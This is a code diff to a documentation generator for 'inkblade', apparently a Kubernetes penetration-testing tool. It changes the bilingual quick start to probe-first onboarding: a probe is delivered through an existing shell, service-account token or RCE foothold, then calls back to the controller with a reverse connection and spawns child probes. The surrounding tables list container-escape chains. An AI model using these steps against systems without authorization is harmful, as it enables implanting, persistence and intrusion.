@@ -262,8 +262,8 @@ WORKFLOW9 = [
      "session open 记录入口方式、目标、命名空间、Pod 与凭据指纹。", "session record", "会话记录"),
     ("2", "Rust probe", "Rust 探针", "probe deploy delivers the static binary and registers its identity and hash.",
      "probe deploy 投放静态二进制并登记身份与哈希。", "probe identity", "探针身份"),
-    ("3", "Channel", "通道", "channel start carries the framed protocol and exposes loopback SOCKS5 and forwards.",
-     "channel start 承载帧协议，提供回环 SOCKS5 与端口转发。", "channel state", "通道状态"),
+    ("3", "Channel", "通道", "channel listen accepts the probe's reverse connection; a stdio channel is available when a local transport exists.",
+     "channel listen 接收探针主动回连；存在本地命令通道时也可用 stdio 通道。", "channel state", "通道状态"),
     ("4", "Detection", "检测", "session run, run and agent run execute templates across the ten layers.",
      "session run、run 与 agent run 按十层执行模板。", "findings, evidence", "发现、证据"),
     ("5", "Escape", "逃逸", "execute resolves a chain; write steps pass the backup gate first.",
@@ -283,7 +283,7 @@ COMMANDS = [
     ("Authorization", "授权记录", "inkblade quickstart · inkblade roe"),
     ("Session", "会话", "inkblade session open|status|close|run"),
     ("Probe", "探针", "inkblade probe deploy|list|collect|exec|read-file|list-files|upload|download|spawn|cleanup"),
-    ("Channel", "通道", "inkblade channel start|status|stop"),
+    ("Channel", "通道", "inkblade channel listen|start|status|stop"),
     ("One template", "单模板", "inkblade session run --id <session> --module <key> · inkblade run --module <key>"),
     ("Chain", "链", "inkblade execute --chain <id> [--dry-run]"),
     ("Agent", "Agent", "inkblade agent run|status|trace|resume|replay|stop"),
@@ -491,50 +491,56 @@ section(
 
 section(
     "quickstart", "Quick start", "快速开始",
-    "Real environment, five steps", "真实环境，五步接入",
-    "Install, authorize, deliver, run, report", "安装、授权、投放、运行、报告",
-    en="""<p>Run against a cluster you are authorized to test.</p>
+    "Probe-first onboarding", "探针优先接入",
+    "Install, attach, deliver, run, report", "安装、接入、投放、运行、报告",
+    en="""<p>Start from the console and attach the probe or foothold you already hold. The default foothold is a least-privilege Pod: non-root, no hostPath or privileged mode, no kubeconfig, outbound TCP only.</p>
 <ol class="steps">
   <li><b>python -m pip install -e .</b><span>Install the controller. Python 3.10 – 3.13, no compiler.</span></li>
-  <li><b>python -m inkblade up</b><span>Onboarding wizard: workspace, authorization, kubeconfig.</span></li>
-  <li><b>python -m inkblade quickstart</b><span>Sign the record: target, scope, level, window.</span></li>
-  <li><b>python -m inkblade session open --mode kubeconfig ...</b><span>Bind the target and open the session.</span></li>
-  <li><b>python -m inkblade probe deploy --via kubectl ... --allow-write</b><span>Deliver the static probe and register it.</span></li>
+  <li><b>python -m inkblade up</b><span>Start the console, sign in, sign the authorization record.</span></li>
+  <li><b>python -m inkblade probe list</b><span>Attach an existing probe; the controller listens and the probe connects back.</span></li>
+  <li><b>python -m inkblade session open --mode foothold ...</b><span>First delivery from the shell, SA token or RCE you already hold.</span></li>
+  <li><b>python -m inkblade agent run --probe &lt;probe-id&gt; ...</b><span>Run detection through the probe channel, then report.</span></li>
 </ol>
 <div class="term">
-  <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="label">terminal · authorized cluster</span></div>
+  <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="label">terminal · probe-first</span></div>
 <pre><code><span class="p">$</span> python -m inkblade up
 <span class="p">$</span> python -m inkblade quickstart
-<span class="p">$</span> python -m inkblade session open --mode kubeconfig --workspace ./work \
-    --kubeconfig ~/.kube/config --namespace ml-team --pod infer-0
-<span class="p">$</span> python -m inkblade probe deploy --session &lt;session-id&gt; --via kubectl \
-    --binary ./inkblade-probe-linux-amd64 --namespace ml-team --pod infer-0 --allow-write
+<span class="p">$</span> python -m inkblade probe list
+<span class="p">$</span> python -m inkblade channel listen
+<span class="p">$</span> python -m inkblade session open --mode foothold --target &lt;target&gt; \
+    --credential-source pod-shell --namespace &lt;namespace&gt; --pod &lt;pod&gt;
+<span class="p">$</span> python -m inkblade probe deploy --session &lt;session-id&gt; --via rce \
+    --binary ./inkblade-probe-linux-amd64 --probe-token-file ./probe.token --allow-write
+<span class="p">$</span> inkblade-probe reverse --host &lt;controller&gt; --port &lt;port&gt;
 <span class="p">$</span> python -m inkblade agent run --probe &lt;probe-id&gt; --objective read-only-recon --workspace ./work
 <span class="p">$</span> python -m inkblade report --run &lt;run-id&gt; --lang bi</code></pre>
 </div>
-<p class="note">agent run prints the run_id consumed by report. Writes need the signed record and --allow-write; without it, probe deploy prints the plan.</p>
-<p class="note"><a href="INSTALL.md">Install</a> · <a href="QUICKSTART.md">Quick start</a> · <a href="USAGE.md">Usage</a></p>""",
-    zh="""<p>在你有权测试的集群上运行。</p>
+<p class="note">Child probes are delivered from the parent with probe upload + probe spawn and call back the same way. A stdio channel (channel start) is available when a local command transport exists. A kubeconfig is optional, only for a first batch bootstrap of several Pods.</p>
+<p class="note"><a href="QUICKSTART.md">Quick start</a> · <a href="INSTALL.md">Install</a> · <a href="USAGE.md">Usage</a></p>""",
+    zh="""<p>从控制台开始，接入你已有的探针或立足点。默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。</p>
 <ol class="steps">
   <li><b>python -m pip install -e .</b><span>安装控制端。Python 3.10 – 3.13，不需要编译器。</span></li>
-  <li><b>python -m inkblade up</b><span>接入向导：工作区、授权、kubeconfig。</span></li>
-  <li><b>python -m inkblade quickstart</b><span>签记录：目标、范围、级别、时间窗。</span></li>
-  <li><b>python -m inkblade session open --mode kubeconfig ...</b><span>绑定目标并打开会话。</span></li>
-  <li><b>python -m inkblade probe deploy --via kubectl ... --allow-write</b><span>投放静态探针并登记。</span></li>
+  <li><b>python -m inkblade up</b><span>启动控制台、浏览器登录、签授权记录。</span></li>
+  <li><b>python -m inkblade probe list</b><span>接入已有探针；控制端监听，探针主动回连。</span></li>
+  <li><b>python -m inkblade session open --mode foothold ...</b><span>用已有 shell、SA token 或 RCE 完成首次投放。</span></li>
+  <li><b>python -m inkblade agent run --probe &lt;probe-id&gt; ...</b><span>通过探针通道执行检测，再出报告。</span></li>
 </ol>
 <div class="term">
-  <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="label">终端 · 授权集群</span></div>
+  <div class="term-bar"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="label">终端 · 探针优先</span></div>
 <pre><code><span class="p">$</span> python -m inkblade up
 <span class="p">$</span> python -m inkblade quickstart
-<span class="p">$</span> python -m inkblade session open --mode kubeconfig --workspace ./work \
-    --kubeconfig ~/.kube/config --namespace ml-team --pod infer-0
-<span class="p">$</span> python -m inkblade probe deploy --session &lt;session-id&gt; --via kubectl \
-    --binary ./inkblade-probe-linux-amd64 --namespace ml-team --pod infer-0 --allow-write
+<span class="p">$</span> python -m inkblade probe list
+<span class="p">$</span> python -m inkblade channel listen
+<span class="p">$</span> python -m inkblade session open --mode foothold --target &lt;target&gt; \
+    --credential-source pod-shell --namespace &lt;namespace&gt; --pod &lt;pod&gt;
+<span class="p">$</span> python -m inkblade probe deploy --session &lt;session-id&gt; --via rce \
+    --binary ./inkblade-probe-linux-amd64 --probe-token-file ./probe.token --allow-write
+<span class="p">$</span> inkblade-probe reverse --host &lt;controller&gt; --port &lt;port&gt;
 <span class="p">$</span> python -m inkblade agent run --probe &lt;probe-id&gt; --objective read-only-recon --workspace ./work
 <span class="p">$</span> python -m inkblade report --run &lt;run-id&gt; --lang bi</code></pre>
 </div>
-<p class="note">agent run 打印 report 需要的 run_id。写操作要签署记录与 --allow-write；不带时 probe deploy 只出计划。</p>
-<p class="note"><a href="INSTALL.md">安装</a> · <a href="QUICKSTART.md">快速开始</a> · <a href="USAGE.md">使用</a></p>""",
+<p class="note">子探针由父探针用 probe upload + probe spawn 投放，并以同样方式回连。存在本地命令通道时可用 stdio 通道（channel start）。kubeconfig 是可选的，只用于首次批量 bootstrap。</p>
+<p class="note"><a href="QUICKSTART.md">快速开始</a> · <a href="INSTALL.md">安装</a> · <a href="USAGE.md">使用</a></p>""",
 )
 
 section(
